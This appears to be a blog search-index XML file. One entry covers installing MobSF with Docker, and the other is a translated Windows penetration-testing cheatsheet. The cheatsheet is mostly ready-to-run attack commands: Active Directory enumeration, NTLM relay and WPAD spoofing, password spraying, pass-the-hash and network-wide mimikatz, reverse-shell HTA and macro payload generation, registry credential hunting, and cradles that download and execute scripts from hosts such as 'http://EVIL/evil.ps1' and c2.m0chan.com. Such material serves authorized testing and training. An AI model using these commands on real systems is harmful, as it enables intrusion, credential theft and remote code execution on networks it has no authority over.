<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[使用docker安装移动安全框架（MobSF）]]></title>
    <url>%2F2019%2F10%2F11%2F%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%EF%BC%88MobSF%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 前言移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android /iOS /Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由CapFuzz（一种特定于Web API的安全扫描程序）提供支持的Web API模糊测试功能。MobSF旨在使您的CI / CD或DevSecOps管道集成无缝。 0x01 开始安装 安装环境： Kali Linux x64 Docker Python3.6环境 12 #使用python3环境update-alternatives --config python 选择python3前面的编号 12#卸载docker，如何之前安装的话apt-get purge docker.io 下载docker安装包 1wget https://download.docker.com/linux/debian/dists/jessie/pool/stable/amd64/docker-ce_17.06.2~ce-0~debian_amd64.deb 安装docker 1dpkg -i docker-ce_17.06.2~ce-0~debian_amd64.deb 启动docker服务 1service docker restart docker一键部署framework-mobsf 1docker pull opensecurity/mobile-security-framework-mobsf 0x02 开始使用1docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest 然后在kali中使用获取浏览器访问：htpp://0.0.0.0:8000 或者使用ifconfig命令查看kali的ip地址，然后使用http://kali的ip地址:8000访问 0x03 总结如果不适用docker一键化部署的话，可能非常的繁琐，所以这里使用了docker进行一键化部署，由于是同事推荐的，然后直接教我怎么部署了，这里也避免走了一些坑，所以大家在部署的过程中还碰到坑的话，就自行百度吧 ^v^.]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>MobSF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows Notes]]></title>
    <url>%2F2019%2F10%2F11%2FWindows-Notes%2F</url>
    <content type="text"><![CDATA[0x00 前言本文为翻译文章，为了记录在对Windows系统进行渗透测试过程中的一些命令和知识。 原文链接：https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html 0x01 列举1.1 基本命令1234567891011121314151617181920212223net usersnet users /domainnet localgroupnet groups /domainnet groups /domain &quot;Domain Admins&quot;Get-ADUserGet-DomainGet-DomainUserGet-DomainGroupGet-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain m0chanAD.local -DomainController 10.10.14.10Find-DomainShare#Host Discoverynetdiscover -r subnet/24nbtscan -r [range]for /L %i in (1,1,255) do @ping.exe -n 1 -w 50 &lt;10.10.10&gt;.%i | findstr TTL#Reverse DNS Lookup$ComputerIPAddress = &quot;10.10.14.14&quot;[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName https://github.com/tevora-threat/SharpView 1.1.1 具有SPN的用户1234Get-DomainUser -SPNGet-ADComputer -filter &#123;ServicePrincipalName -like &lt;keyword&gt;&#125; -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation 1.1.2 Kerberos枚举1nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&apos;test&apos; 1.1.3 红队CSharp脚本123456789101112131415161718#https://github.com/Mr-Un1k0d3r/RedTeamCSharpScriptsLDAPUtility.csUsage: ldaputility.exe options domain [arguments]ldaputility.exe DumpAllUsers m0chanldaputility.exe DumpUser m0chan mr.un1k0d3rldaputility.exe DumpUsersEmail m0chanldaputility.exe DumpAllComputers m0chan ldaputility.exe DumpComputer m0chan DC01ldaputility.exe DumpAllGroups m0chanldaputility.exe DumpGroup m0chan &quot;Domain Admins&quot;ldaputility.exe DumpPasswordPolicy m0chanAlso WMIUtility.cs for WMI Calls &amp; LDAPQuery.cs for Raw LDAP Queries.See github linked above for full details. 1.1.4 活动目录123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566nltest /DCLIST:DomainNamenltest /DCNAME:DomainNamenltest /DSGETDC:DomainName# Get Current Domain Info - Similar to Get-Domain[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()# Get Domain Trust Info - Similar to Get-DomainTrust([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()# View Domain Info[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()# View Domain Trust Information([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&apos;Forest&apos;, &apos;forest-of-interest.local&apos;)))).GetAllTrustRelationships()nltest [server:&lt;fqdn_foreign_domain&gt;] /domain_trusts /all_trusts /vnltest /dsgetfti:&lt;domain&gt;nltest /server:&lt;ip_dc&gt; /domain_trusts /all_trusts([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()# View All Domain Controllersnltest /dclist:offense.localnet group &quot;domain controllers&quot; /domain# View DC for Current Sessionnltest /dsgetdc:m0chanAD.local# View Domain Trusts from CMDnltest /domain_trusts# View User Info from CMDnltest /user:&quot;m0chan&quot;# get domain name and DC the user authenticated toklist# Get All Logged on Sessions, Includes NTLM &amp; Kerberosklist sessions# View Kerb Ticketsklist# View Cached Krbtgtklist tgt# whoami on older Windows systemsset u#List all Usernames([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=*))&quot;).FindAll().Properties.samaccountname#List Administrators([adsisearcher]&quot;(&amp;(objectClass=User)(admincount=1))&quot;).FindAll().Properties.samaccountname#List all Info about Specific User([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=&lt;username&gt;))&quot;).FindAll().Properties#View All Users with Description Field Set([adsisearcher]&quot;(&amp;(objectClass=group)(samaccountname=*))&quot;).FindAll().Properties | % &#123; Write-Host $_.samaccountname : $_.description &#125; 1.1.5 从Linux Box进行AD枚举-AD工具1234567891011121314151617181920#https://github.com/jasonwbarnett/linux-adtooltar zxvf adtools-1.x.tar.gzcd adtools-1.x./configuremakemake install&gt; adtool list ou=user,dc=example,dc=comCN=allusers,OU=user,DC=example,DC=comOU=finance,OU=user,DC=example,DC=comOU=administration,OU=user,DC=example,DC=com&gt; adtool oucreate marketing ou=user,dc=example,dc=com&gt; adtool useradd jsmith ou=marketing,ou=user,dc=example,dc=com&gt; adtool setpass jsmith banana&gt; adtool unlock jsmith&gt; adtool groupadd allusers jsmith&gt; adtool attributereplace jsmith telephonenumber 123&gt; adtool attributereplace jsmith mail jsmith@example.com 1.1.6 SharpView枚举12345678910111213141516171819202122232425262728293031#https://github.com/tevora-threat/SharpViewGet-DomainFileServerGet-DomainGPOUserLocalGroupMappingFind-GPOLocationGet-DomainGPOComputerLocalGroupMappingFind-GPOComputerAdminGet-DomainObjectAclGet-ObjectAclAdd-DomainObjectAclAdd-ObjectAclRemove-DomainObjectAclGet-RegLoggedOnGet-LoggedOnLocalGet-NetRDPSessionTest-AdminAccessInvoke-CheckLocalAdminAccessGet-WMIProcessGet-NetProcessGet-WMIRegProxyGet-ProxyGet-WMIRegLastLoggedOnGet-LastLoggedOnGet-WMIRegCachedRDPConnectionGet-CachedRDPConnectionGet-WMIRegMountedDriveGet-RegistryMountedDriveFind-InterestingDomainAclInvoke-ACLScannerGet-NetShareGet-NetLoggedon 1.1.7 SMB枚举1234567891011121314nmap -p 139,445 --script smb.nse,smb-enum-shares,smblsenum4linux 1.3.3.7smbmap -H 1.3.3.7smbclient -L \\INSERTIPADDRESSsmbclient -L INSERTIPADDRESSsmbclient //INSERTIPADDRESS/tmpsmbclient \\\\INSERTIPADDRESS\\ipc$ -U johnsmbclient //INSERTIPADDRESS/ipc$ -U johnsmbclient //INSERTIPADDRESS/admin$ -U johnnbtscan [SUBNET]#Check for SMB Signingnmap --script smb-security-mode.nse -p 445 10.10.14.14 1.1.8 SNMP枚举12345snmpwalk -c public -v1 10.10.14.14snmpcheck -t 10.10.14.14 -c publiconesixtyone -c names -i hostsnmap -sT -p 161 10.10.14.14 -oG snmp_results.txtsnmpenum -t 10.10.14.14 1.1.9 MySQL枚举1nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 1.1.10 DNS区域转移123dig axfr blah.com @ns1.m0chan.comnslookup -&gt; set type=any -&gt; ls -d m0chan.comdnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml 1.1.11 LDAP12ldapsearch -H ldap://&lt;ip&gt;ldapwhoami 1.1.12 RPC枚举1234567891011rpcclient -U &quot;10.10.14.14&quot;srvinfoenumdomusersenumalsgroups domainlookupnames administratorsquerydominfoenumdomusersqueryuser &lt;user&gt;lsaquerylookupnames Guestlookupnames Administrator 1.1.13 远程桌面1234rdesktop -u guest -p guest INSERTIPADDRESS -g 94%# Brute forcencrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS 0x02 文件传输2.1 TFTP123456m0chan Machinemkdir tftpatftpd --deamon --port 69 tftpcp *file* tftpOn victim machine:tftp -i &lt;[IP]&gt; GET &lt;[FILE]&gt; 2.2 FTP1234567echo open &lt;[IP]&gt; 21 &gt; ftp.txtecho USER demo &gt;&gt; ftp.txtecho ftp &gt;&gt; ftp.txtecho bin &gt;&gt; ftp.txtecho GET nc.exe &gt;&gt; ftp.txtecho bye &gt;&gt; ftp.txtftp -v -n -s:ftp.txt 2.3 VBS Script1234567891011121314151617181920212223242526272829303132echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbsecho StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbsecho Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbsecho Err.Clear &gt;&gt; wget.vbsecho Set http = Nothing &gt;&gt; wget.vbsecho Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbsecho If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbsecho If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbsecho If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbsecho http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbsecho http.Send &gt;&gt; wget.vbsecho varByteArray = http.ResponseBody &gt;&gt; wget.vbsecho Set http = Nothing &gt;&gt; wget.vbsecho Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbsecho Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbsecho strData = &quot;&quot; &gt;&gt; wget.vbsecho strBuffer = &quot;&quot; &gt;&gt; wget.vbsecho For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbsecho ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbsecho Next &gt;&gt; wget.vbsecho ts.Close &gt;&gt; wget.vbscscript wget.vbs &lt;url&gt; &lt;out_file&gt;Use echoup function on pentest.ws to generate echo commands.https://pentest.ws/features 2.4 Powershell123456789101112131415#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradlesInvoke-WebRequest &quot;https://server/filename&quot; -OutFile &quot;C:\Windows\Temp\filename&quot;(New-Object System.Net.WebClient).DownloadFile(&quot;https://server/filename&quot;, &quot;C:\Windows\Temp\filename&quot;) #Powershell Download to MemoryIEX(New-Object Net.WebClient).downloadString(&apos;http://server/script.ps1&apos;)#Powershell with Proxy$browser = New-Object System.Net.WebClient;$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX($browser.DownloadString(&apos;https://server/script.ps1&apos;)); 2.5 Powershell Base6412345$fileName = &quot;Passwords.kdbx&quot;$fileContent = get-content $fileName$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)$fileContentEncoded | set-content ($fileName + &quot;.b64&quot;) 2.6 安全复制/ pscp.exe12pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txtpscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt 2.7 BitsAdmin.exe1cmd.exe /c &quot;bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe &amp; start C:\Temp\binary.exe&quot; 2.8 Remote Desktop1rdesktop 10.10.10.10 -r disk:linux=&apos;/home/user/filetransferout&apos; 2.9 WinHTTP Com Object123[System.Net.WebRequest]::DefaultWebProxy[System.Net.CredentialCache]::DefaultNetworkCredentials$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open(&apos;GET&apos;,&apos;http://EVIL/evil.ps1&apos;,$false);$h.send();iex $h.responseText 2.10 CertUtil12345678#File Transfercertutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename#CertUtil Base64 Transferscertutil.exe -encode inputFileName encodedOutputFileNamecertutil.exe -decode encodedInputFileName decodedOutputFileName 2.11 Curl (Windows 1803+)1234curl http://server/file -o filecurl http://server/file.bat | cmdIEX(curl http://server/script.ps1);Invoke-Blah 2.12 SMB1python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support 0x03 exploit3.1 LLMNR / NBT-NS欺骗12345678#Responder to Steal Credsgit clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i/e if you search \\HRServer\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like&apos;Yeah I&apos;m HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below&apos; 3.2 Responder WPAD Attack1234567responder -I eth0 wpadBy default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internetGo to internet explorer and search for Google which automatically searches for a WPAD file... Then take NTLMv2 hash and NTLM Relay it or send to cracking rig. 3.3 mitm612345678910111213141516#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. By default IPV6 should be enabled. git clone https://github.com/fox-it/mitm6.git cd /opt/tools/mitm6pip install .mitm6 -d m0chanAD.localNow the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by attacker. ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ -i-i opens an interactive shell.Shout out to hausec for this super nice tip. 3.4 SCF文件攻击12345678910Create .scf file and drop inside SMB Share and fire up Responder ;) Filename = @m0chan.scf[Shell]Command=2IconFile=\\10.10.14.2\Share\test.ico[Taskbar]Command=ToggleDesktop 3.5 NTLM-Relay1234567891011121314151617181920212223Good article explaining differences between NTLM/Net-NTLMV1&amp;V2https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.htmlTL;DR NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.You CAN perform Pass-The-Hash attacks with NTLM hashes.You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.PS: You CANNOT relay a hash back to itself.PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexeccrackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txtThis will tell you a list of hosts within a subnet which do not have SMB Signing enabled.python Responder.py -I &lt;interface&gt; -r -d -wntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)How about we execute a command instead.ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasdntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP 3.6 私下交易1234567#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/Combine privxchange.py and ntlmrelayxntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATEpython privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local 3.7 Exchange Password Spray12345678#https://github.com/dafthack/MailSniper.gitInvoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\users.txt -Password Winter2019#https://github.com/sensepost/ruler./ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v 3.8 ExchangeRelayX123456#https://github.com/quickbreach/ExchangeRelayXAn NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers../exchangeRelayx.py -t https://mail.quickbreach.com 3.9 Exchange Mailbox Post-Compromise123456789101112131415161718192021#https://github.com/dafthack/MailSniper.gitEnumerate GlobalAddressListGet-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019Enumerate AD UsernamesGet-ADUsernameFromEWS -Emaillist .\users.txtEnumerate Mailbox FoldersGet-MailboxFolders -Mailbox jamie@m0chanAD.localEnumerate Passwords &amp; Credentials Stored in EmailsInvoke-SelfSearch -Mailbox jamie@m0chanAD.localEnumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange AdminInvoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012 3.10 CrackMapExec123456789101112131415161718192021222324252627282930313233343536373839CrackMapExec is installed on Kali or get Windows Binary from Github.Has 3 Execution Methodscrackmapexec smb &lt;- Creating and Running a Service over SMBcrackmapexec wmi &lt;- Executes command over WMIcrackmapexec at &lt;- Schedules Task with Task SchedulerCan execute plain commands with -X flag i/e crcakmapexec smb 10.10.14.0/24 -x whoamicrcakmapexec smb 10.10.14.0/24 &lt;- Host Discoverycrackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --pass-polcrackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --sharesCan also PTH with CMEcrackmapexec smb 10.10.14.0/24 -u user -H e8bcd502fbbdcd9379305dca15f4854ecme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares --local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPSDump Local SAM hashescrackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth --samRunning Mimikatz crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M mimikatz^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain AdminEnum AV Productscrackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M enum_avproducts 3.11 邮件狙击手1234567Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019[*] Now spraying the OWA portal at https://m0chanAD.local/owa/[*] SUCCESS! User:m0chan:Summer2019Lmao, you really think Id use the pass Summer2019? 3.12 Kerberos Stuff12#https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#https://m0chan.github.io/Kerberos-Attacks-In-Depth 3.13 MSSQL利用（PowerUpSQL）1234567891011121314151617181920212223242526272829303132333435363738#https://github.com/NetSPI/PowerUpSQL#View SQL InstancesGet-SQLInstanceDomain [| Get-SQLServerInfo]#Login in with Domain AccountGet-SQLConnectionTestThreaded#Login in with Default PasswordGet-SQLServerDefaultLoginPw#List DB, Tables &amp; ColumnsGet-SQLInstanceDomain | Get-SQLDatabaseGet-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DB_name&gt;Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DB_name&gt; -TableName &lt;Table_name&gt;#Search Column Names for WordGet-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;word1,word2&gt;&quot; -Verbose -SampleSize 10#Try to Execute Commands (RCE)Invoke-SQLOSCmd#Enable XP_CMDShell ProcessEXEC sp_configure &apos;show advanced options&apos;, 1; go RECONFIGURE; go EXEC sp_configure &apos;xp_cmdshell&apos;, 1; go RECONFIGURE; go xp_cmdshell &apos;&lt;cmd&gt;&apos;go 3.14 Malicious Macro with MSBuild12345678910111213141516171819#https://github.com/infosecn1nja/MaliciousMacroMSBuild#https://lolbas-project.github.io/lolbas/Binaries/Msbuild/ - MSBuild ExplainedCreation of a Shellcode MSBuild VBA Macropython m3-gen.py -p shellcode -i /path/beacon.bin -o output.vbaCreation of a PowerShell MSBuild VBA Macropython m3-gen.py -p powershell -i /path/payload.ps1 -o output.vbaCreation of a Custom MSBuild VBA Macropython m3-gen.py -p custom -i /path/msbuild.xml -o output.vbaCreation of a Shellcode MSBuild VBA Macro With Kill Datepython m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -k 20/03/2018Creation of a Shellcode MSBuild VBA Macro With Environmental Keyingpython m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomainpython m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, microsoft, github 3.15 WeirdHTA - Undetectable HTA1234567#https://github.com/felamos/weirdhtapython3 --helppython3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell)python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat)python3 weirdhta.py 10.10.10.10 4444 --command &apos;c:\windows\system32\cmd.exe&apos; (custom command) 3.16 EvilWinRM1234567891011121314151617#https://github.com/Hackplayers/evil-winrmUltimate Shell for WinRM ConnectionsUsage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] -S, --ssl Enable SSL -c, --pub-key PUBLIC_KEY_PATH Local path to public key certificate -k, --priv-key PRIVATE_KEY_PATH Local path to private key certificate -s, --scripts PS_SCRIPTS_PATH Powershell scripts local path -e, --executables EXES_PATH C# executables local path -i, --ip IP Remote host IP or hostname (required) -U, --url URL Remote url endpoint (default /wsman) -u, --user USER Username (required) -p, --password PASS Password -P, --port PORT Remote host port (default 5985) -V, --version Show version -h, --help Display this help message 3.17 GetVulnerableGPO 123#https://github.com/gpoguy/GetVulnerableGPOPowerShell script to find &apos;vulnerable&apos; security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https://sdmsoftware.com/group-policy-blog/security-related/security-fun-bloodhound-ms16-072-gpo-discoverability/) Requires GPMC &amp; SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https://s3.amazonaws.com/sdmsoftware.com/dl/SDM-GPMC-Module2.0Setup.zip 3.18 Invoke-PSImage 1234567891011121314#https://github.com/peewpw/Invoke-PSImageEncodes a PowerShell script in the pixels of a PNG file and generates a oneliner to executeInvoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.PS&gt;Import-Module .\Invoke-PSImage.ps1PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg [Oneliner to execute from a file] PS&gt;Import-Module .\Invoke-PSImage.ps1PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest [Oneliner to execute from the web] 3.17 Meterpreter + Donut-Shellcode注入.NET12345678910#https://iwantmore.pizza/posts/meterpreter-shellcode-inject.htmlA module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively!donut -f /tmp/mimikatz.exe -a 2 -o /tmp/payload.binuse post/windows/manage/shellcode_injectset SHELLCODE /tmp/payload.binset SESSION 1run 0x04 特权提升 参考：https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ 运行此脚本：https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat 4.1 基本命令1234567891011systeminfowmic qfenet usershostnamewhoaminet localgroupsecho %logonserver%netsh firewall show statenetsh firewall show confignetstat -antype C:\Windows\system32\drivers\etc\hosts 4.2 PowerUp.ps1（有时是快速获胜）1powershell.exe /c IEX(New-Object Net.WebClient).downloadString(&apos;webserver/PowerUp.ps1&apos;) ;Invoke-AllChecks 4.3 锐化123#https://github.com/GhostPack/SharpUpC Sharp Implementation of PowerUp.ps1 which can be reflectively loaded. 4.4 如果是公元，引进猎狗犬…12345678910SharpHound.ps1SharpHound.exe -&gt; https://github.com/BloodHoundAD/SharpHoundIEX(System.Net.WebClient.DownloadString(&apos;http://webserver:4444/SharpHound.ps1&apos;))Invoke-CollectionMethod AllImport .zip to BloodhoundIf you can&apos;t exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It&apos;s a big big pain but it works. 4.5 Bloodhound-Python1234git clone https://github.com/fox-it/BloodHound.py.gitcd BloodHound.py/ &amp;&amp; pip install .bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all 4.6 明文密码123456789101112131415# Windows autologinreg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;# VNCreg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;# SNMP Parametersreg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;# Puttyreg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;# Search for password in registryreg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s 4.7 查看已安装的软件123456789101112tasklist /SVCnet startreg query HKEY_LOCAL_MACHINE\SOFTWAREDRIVERQUERYdir /a &quot;C:\Program Files&quot;dir /a &quot;C:\Program Files (x86)&quot;reg query HKEY_LOCAL_MACHINE\SOFTWAREGet-ChildItem &apos;C:\Program Files&apos;, &apos;C:\Program Files (x86)&apos; | ft Parent,Name,LastWriteTimeGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name 4.8 弱文件夹权限123456789101112131415Full Permissions for &apos;Everyone&apos; on Program Foldersicacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot; Modify Permissions for Everyone on Program Foldersicacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; 4.9 计划任务1schtasks /query /fo LIST /v 4.10 Powershell历史123type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txtcat (Get-PSReadlineOption).HistorySavePathcat (Get-PSReadlineOption).HistorySavePath | sls passw 4.12 查看已连接的驱动器1234net usewmic logicaldisk get caption,descriptionGet-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;&#125;| ft Name,Root 4.13 查看隐私123whoami /privLook for SeImpersonate, SeDebugPrivilege etc 4.14 还有其他人登录吗？1qwinsta 4.15 查看注册表自动登录123reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;Get-ItemProperty -Path &apos;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&apos; | select &quot;Default*&quot; 4.16 在凭据管理器中查看存储的凭据123456cmdkey /listdir C:\Users\username\AppData\Local\Microsoft\Credentials\dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\ 4.17 查看未引用的服务路径123wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where &#123;$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\Windows*&quot; -and $_.PathName -notlike &apos;&quot;*&apos;&#125; | select PathName,DisplayName,Name 4.18 查看启动项1234567wmic startup get caption,commandreg query HKLM\Software\Microsoft\Windows\CurrentVersion\Runreg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOncereg query HKCU\Software\Microsoft\Windows\CurrentVersion\Runreg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOncedir 